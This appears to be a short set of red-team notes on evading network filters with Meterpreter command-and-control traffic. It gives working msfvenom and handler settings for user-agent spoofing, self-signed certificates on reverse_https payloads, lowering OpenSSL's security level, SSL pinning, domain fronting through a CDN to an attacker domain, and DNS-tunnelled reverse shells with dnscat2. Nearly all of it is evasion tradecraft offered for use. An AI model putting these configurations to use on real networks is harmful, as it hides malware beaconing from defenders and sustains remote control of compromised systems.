## Network filters

we can set user-agent in meterpreter:
#meterpreter
``` bash
set HttpUserAgent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
```

Adding the certificate to the meterpreter/reverse_https
1. Generate self-signed cert with priv key:
#certgen #openssl #bash
``` bash
openssl req -new -x509 -nodes -out cert.crt -keyout priv.key
```
2. Create key and cert in pem format:
``` bash
cat priv.key cert.crt > nasa.pem
```
3. Change the SSL options in /etc/ssl/openssl.cnf
``` bash
# Remove this:
CipherString=DEFAULT@SECLEVEL=2
# Add this:
CipherString=DEFAULT
```
then in multihandler:
#meterpreter 
``` bash
set HandlerSSLCert /home/kali/self_cert/nasa.pem
```

### SSL Pining on the meterpreter beacon

Set the following options when creating a payload to enable the SSL pinning:
#msfvenom 
```bash
StagerVerifySSLCert=true HandlerSSLCert=<path_to_pem>
```

### Domain Squatting with meterpreter

When generating the shellcode (exe in this case) we specify good domain in LHOST e.g. good.com behind the CDN to make the good DNS query, and in the HttpHostHeader we specify our CDN domain (malicous) which proxypass to our bad.com domain.
#msfvenom 
```bash
LHOST=good.com HttpHostHeader=cdn123bad.provider.com
```

### DNS Tunelling

Limited and slow, but since it is allowed everywhere we can use the dnscat2.
We must own the domain and set the NS record for that domain to point to our server. Then every subdomin queries will be forwarded to that name server we control.
#reverseshell #tunelling #dns

https://github.com/iagox86/dnscat2


